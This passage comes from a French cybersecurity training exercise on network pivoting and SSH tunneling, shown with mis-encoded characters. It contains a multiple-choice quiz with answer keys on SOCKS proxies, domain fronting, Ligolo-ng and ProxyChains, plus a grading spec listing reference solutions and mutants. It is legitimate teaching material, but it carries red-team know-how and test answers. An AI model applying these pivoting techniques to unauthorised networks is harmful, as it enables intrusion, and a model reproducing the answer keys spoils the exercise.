                    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**Application au code :**
```rust
// Chaque niveau de pivot = un niveau de rÃªve
// Le "kick" pour remonter = fermer le tunnel
fn go_deeper(current_level: usize) {
    // "The deeper you go, the more unstable it becomes"
    // â†’ Plus de sauts = plus de risque de dÃ©tection
    let stability = 10 - current_level;
}
```

#### ğŸ® MEME : "Portal â€” Thinking with Portals"

Comme dans Portal, un tunnel crÃ©e une "porte" entre deux points normalement inaccessibles :

```
    SSH Tunnel = Portal Gun

    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                 â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚   Segment A â”‚   â•â•â•â•â•â•â•â•â•â•â•   â”‚   Segment B â”‚
    â”‚             â”‚   SSH Tunnel    â”‚             â”‚
    â”‚    [ğŸ”µ]     â”‚                 â”‚    [ğŸŸ ]     â”‚
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                 â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

    "Now you're thinking with TUNNELS!"
```

### 5.9 Applications pratiques

| Contexte | Application |
|----------|-------------|
| **Red Team** | Planifier les chemins de pivot pendant l'engagement |
| **Blue Team** | Identifier les chemins de pivot potentiels Ã  surveiller |
| **Architecture** | Valider la segmentation rÃ©seau |
| **Compliance** | VÃ©rifier l'isolation des zones sensibles |
| **CTF** | RÃ©soudre les challenges de pivoting multi-niveaux |

---

## âš ï¸ SECTION 6 : PIÃˆGES â€” RÃ‰CAPITULATIF

| # | PiÃ¨ge | Erreur Typique | Impact | Solution |
|---|-------|----------------|--------|----------|
| 1 | Cycle graphe | Pas de dÃ©tection de visite | Boucle infinie | HashSet visited |
| 2 | First-match FW | Last-match logique | Faux rÃ©sultats | Return immÃ©diat sur match |
| 3 | Pas de pivot | Chemin sans hÃ´te compromis | Plan impossible | VÃ©rifier hosts par segment |
| 4 | Off-by-one | Parcours jusqu'Ã  len() | Index OOB | Parcours jusqu'Ã  len()-1 |
| 5 | Link direction | Ignorer bidirectional | Chemins manquÃ©s | Double ajout si bidirectionnel |

---

## ğŸ“ SECTION 7 : QCM

### Question 1
**Qu'est-ce que le "pivoting" en sÃ©curitÃ© rÃ©seau ?**

A) Une technique de rotation de clÃ©s cryptographiques
B) L'utilisation d'un systÃ¨me compromis pour atteindre d'autres rÃ©seaux
C) La modification des tables de routage
D) Le chiffrement des communications
E) La dÃ©tection d'intrusions
F) Le balayage de ports
G) L'analyse de paquets
H) La crÃ©ation de VLAN
I) Le filtrage MAC
J) Le NAT traversal

**RÃ©ponse : B**

### Question 2
**Quelle commande SSH crÃ©e un proxy SOCKS dynamique ?**

A) `ssh -L 1080:target:22 pivot`
B) `ssh -R 1080:target:22 pivot`
C) `ssh -D 1080 pivot`
D) `ssh -N -f pivot`
E) `ssh -X pivot`
F) `ssh -A pivot`
G) `ssh -T pivot`
H) `ssh -W target:22 pivot`
I) `ssh -J pivot target`
J) `ssh -o ProxyJump=pivot target`

**RÃ©ponse : C**

### Question 3
**Dans un firewall first-match avec les rÃ¨gles [allow 443, deny *], le port 80 est :**

A) AutorisÃ© car 80 < 443
B) RefusÃ© car deny * match
C) AutorisÃ© car c'est HTTP
D) IndÃ©terminÃ©
E) AutorisÃ© par dÃ©faut
F) LoguÃ© seulement
G) RedirectÃ© vers 443
H) AutorisÃ© si Ã©tabli
I) RefusÃ© seulement en entrÃ©e
J) DÃ©pend du protocole

**RÃ©ponse : B**

### Question 4
**Le domain fronting exploite :**

A) Les vulnÃ©rabilitÃ©s DNS
B) La diffÃ©rence entre SNI TLS et Host HTTP
C) Les failles de certificats
D) Le bypass de firewall par fragmentation
E) L'usurpation d'adresse MAC
F) Les erreurs de routage BGP
G) Les collisions de hash
H) Le buffer overflow HTTP
I) L'injection SQL
J) Le cross-site scripting

**RÃ©ponse : B**

### Question 5
**Ligolo-ng utilise quelle interface pour le tunneling ?**

A) TAP (Layer 2)
B) TUN (Layer 3)
C) SOCKS5
D) HTTP CONNECT
E) WebSocket
F) gRPC
G) QUIC
H) WireGuard
I) IPsec
J) GRE

**RÃ©ponse : B**

### Question 6
**Pour trouver TOUS les chemins dans un graphe, quelle complexitÃ© est attendue ?**

A) O(V)
B) O(E)
C) O(V + E)
D) O(V Ã— E)
E) O(VÂ²)
F) O(V!)
G) O(2^V)
H) O(V Ã— E Ã— log V)
I) O(E Ã— log E)
J) O(1)

**RÃ©ponse : G** (exponentiel dans le pire cas)

### Question 7
**Un hÃ´te compromis avec capabilities ["nc", "python"] mais pas "ssh" peut crÃ©er quel type de tunnel ?**

A) SSH uniquement
B) Aucun tunnel possible
C) Tunnel TCP via netcat ou script Python
D) VPN complet
E) IPsec tunnel
F) SOCKS5 natif
G) WireGuard
H) OpenVPN
I) Tunnel SSL/TLS uniquement
J) Tunnel HTTP seulement

**RÃ©ponse : C**

### Question 8
**Quel est le risque principal d'un chemin de pivot Ã  5 sauts vs 2 sauts ?**

A) Latence rÃ©seau plus Ã©levÃ©e
B) Risque de dÃ©tection cumulatif plus important
C) Consommation mÃ©moire accrue
D) IncompatibilitÃ© protocole
E) Limitation de bande passante
F) ProblÃ¨mes de certificats
G) Conflits de ports
H) Saturation des tables ARP
I) Expiration des sessions
J) Fragmentation IP

**RÃ©ponse : B**

### Question 9
**ProxyChains est utilisÃ© pour :**

A) CrÃ©er des tunnels SSH
B) Router le trafic d'applications Ã  travers un proxy SOCKS
C) Ã‰tablir des connexions VPN
D) Analyser le trafic rÃ©seau
E) GÃ©rer les certificats SSL
F) Configurer le firewall
G) Scanner les vulnÃ©rabilitÃ©s
H) Chiffrer les fichiers
I) Monitorer les processus
J) GÃ©rer les conteneurs

**RÃ©ponse : B**

### Question 10
**Dans l'analyse de pivoting, pourquoi faut-il vÃ©rifier les "segments intermÃ©diaires" ?**

A) Pour calculer la latence
B) Pour compter le nombre de sauts
C) Pour vÃ©rifier qu'on a un point de pivot (hÃ´te compromis) dans chaque segment traversÃ©
D) Pour optimiser la bande passante
E) Pour valider les certificats
F) Pour vÃ©rifier la MTU
G) Pour dÃ©tecter les boucles de routage
H) Pour mesurer le jitter
I) Pour identifier les NAT
J) Pour mapper les VLAN

**RÃ©ponse : C**

---

## ğŸ“Š SECTION 8 : RÃ‰CAPITULATIF

| Ã‰lÃ©ment | Valeur |
|---------|--------|
| **Concept principal** | Network Pivoting & Tunneling |
| **DifficultÃ©** | 9/10 |
| **Algorithmes clÃ©s** | BFS, Dijkstra, First-match firewall |
| **Structures** | HashMap (graphe), HashSet (visited), VecDeque (BFS) |
| **ComplexitÃ© temps** | O(V Ã— E Ã— F) |
| **ComplexitÃ© espace** | O(V + E) |
| **Techniques couvertes** | SSH tunneling, Ligolo-ng, SOCKS, Domain fronting |
| **PiÃ¨ge principal** | Cycles graphe + absence d'hÃ´te pivot |
| **MEME** | Inception (rÃªves dans les rÃªves) |
| **Application rÃ©elle** | Red Team pivoting planning |

---

## ğŸ“¦ SECTION 9 : DEPLOYMENT PACK

```json
{
  "deploy": {
    "hackbrain_version": "5.5.2",
    "engine_version": "v22.1",
    "exercise_slug": "3.2.8-i-pivot_master",
    "generated_at": "2026-01-11T00:00:00Z",

    "metadata": {
      "exercise_id": "3.2.8-i",
      "exercise_name": "pivot_master",
      "module": "3.2.8",
      "module_name": "Tunneling & Pivoting AvancÃ©",
      "concept": "i",
      "concept_name": "Ligolo-ng, Pivoting Techniques, Advanced Tunneling, C2 Obfuscation",
      "type": "code",
      "tier": 2,
      "tier_info": "MÃ©lange (concepts i + j + k + l)",
      "phase": 3,
      "difficulty": 9,
      "difficulty_stars": "â˜…â˜…â˜…â˜…â˜…â˜…â˜…â˜…â˜…â˜†",
      "language": "rust",
      "duration_minutes": 540,
      "xp_base": 500,
      "xp_bonus_multiplier": 6,
      "bonus_tier": "GÃ‰NIE",
      "bonus_icon": "ğŸ§ ",
      "complexity_time": "T8 O(V Ã— E Ã— F)",
      "complexity_space": "S6 O(V + E)",
      "prerequisites": ["3.2.8-a", "3.2.6-a", "Graph algorithms"],
      "domains": ["Net", "Struct", "MD"],
      "domains_bonus": ["Crypto", "DP"],
      "tags": ["pivoting", "tunneling", "network", "security", "graphs"],
      "meme_reference": "Inception"
    },

    "files": {
      "spec.json": "/* Section 4.9 */",
      "references/ref_solution.rs": "/* Section 4.3 */",
      "references/ref_solution_bonus.rs": "/* Section 4.6 */",
      "alternatives/alt_dijkstra.rs": "/* Section 4.4 - Alternative 1 */",
      "alternatives/alt_dfs.rs": "/* Section 4.4 - Alternative 2 */",
      "mutants/mutant_a_boundary.rs": "/* Section 4.10 - Off-by-one */",
      "mutants/mutant_b_safety.rs": "/* Section 4.10 - No segment init */",
      "mutants/mutant_c_resource.rs": "/* Section 4.10 - Infinite loop */",
      "mutants/mutant_d_logic.rs": "/* Section 4.10 - Inverted FW logic */",
      "mutants/mutant_e_return.rs": "/* Section 4.10 - Constant stealth */",
      "tests/main.rs": "/* Section 4.2 */"
    },

    "validation": {
      "expected_pass": [
        "references/ref_solution.rs",
        "references/ref_solution_bonus.rs",
        "alternatives/alt_dijkstra.rs",
        "alternatives/alt_dfs.rs"
      ],
      "expected_fail": [
        "mutants/mutant_a_boundary.rs",
        "mutants/mutant_b_safety.rs",
        "mutants/mutant_c_resource.rs",
        "mutants/mutant_d_logic.rs",
        "mutants/mutant_e_return.rs"
      ]
    },

    "commands": {
      "validate_spec": "cargo test --release",
      "test_reference": "cargo run --release < test_input.json",
      "test_mutants": "cargo test --release -- --test-threads=1"
    }
  }
}
```

---

*HACKBRAIN v5.5.2 â€” L'excellence pÃ©dagogique ne se nÃ©gocie pas*
*"You mustn't be afraid to dream a little bigger, darling." â€” Eames, Inception*
